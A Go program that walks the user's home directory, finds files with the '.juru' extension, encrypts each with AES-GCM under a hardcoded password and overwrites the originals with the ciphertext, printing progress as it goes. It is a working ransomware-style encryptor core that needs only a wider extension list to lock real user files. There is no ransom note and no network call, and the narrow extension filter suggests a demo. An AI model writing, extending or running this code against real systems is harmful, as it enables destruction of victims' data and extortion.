package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"time"

	"golang.org/x/crypto/pbkdf2"
)

func mapFleExts(rtDir string, exts []string) ([]string, error) {
	var fleExts []string
	extMap := make(map[string]struct{})
	for _, ext := range exts {
		extMap[ext] = struct{}{}
	}
	er := filepath.Walk(rtDir, func(pth string, inf os.FileInfo, er error) error {
		if er != nil {
			return er
		}
		if !inf.IsDir() {
			ext := filepath.Ext(inf.Name())
			if _, ok := extMap[ext]; ok {
				absPth, er := filepath.Abs(pth)
				if er != nil {
					return er
				}
				fleExts = append(fleExts, absPth)
			}
		}
		return nil
	})
	return fleExts, er
}

func Encrypt(data []byte, pass string) (string, error) {
	key := pbkdf2.Key([]byte(pass), []byte(pass), 100000, 32, sha256.New)
	aesBlock, er := aes.NewCipher(key)
	if er != nil {
		return "", er
	}
	nonce := make([]byte, 12)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	gcm, er := cipher.NewGCM(aesBlock)
	if er != nil {
		return "", er
	}
	ct := gcm.Seal(nonce, nonce, data, nil)
	return base64.StdEncoding.EncodeToString(ct), nil
}

func main() {
	fleExts := []string{".juru"}
	rtDir := ""
	switch runtime.GOOS {
	case "windows":
		rtDir = os.Getenv("USERPROFILE")
	default:
		rtDir = os.Getenv("HOME")
	}
	if rtDir == "" {
		rtDir = "D:\\"
		//rtDir = "C:\\"
	}
	fmt.Println("Mapping Files...")
	flePths, er := mapFleExts(rtDir, fleExts)
	if er != nil {
		panic("ERR: mapping files")
	}
	for _, flePth := range flePths {
		fleDat, er := os.ReadFile(flePth)
		if er != nil {
			panic("ERR: reading file")
		}
		fmt.Printf("Encrypting  ==>  %v\n", filepath.Base(flePth))
		b64Ct, er := Encrypt(fleDat, "juru")
		if er != nil {
			fmt.Println(er)
			return
		}
		time.Sleep(200 * time.Millisecond)
		os.WriteFile(flePth, []byte(b64Ct), 0644)
	}
	fmt.Println("Finalizing")
	time.Sleep(1 * time.Second)
	fmt.Println("All Done.")
}
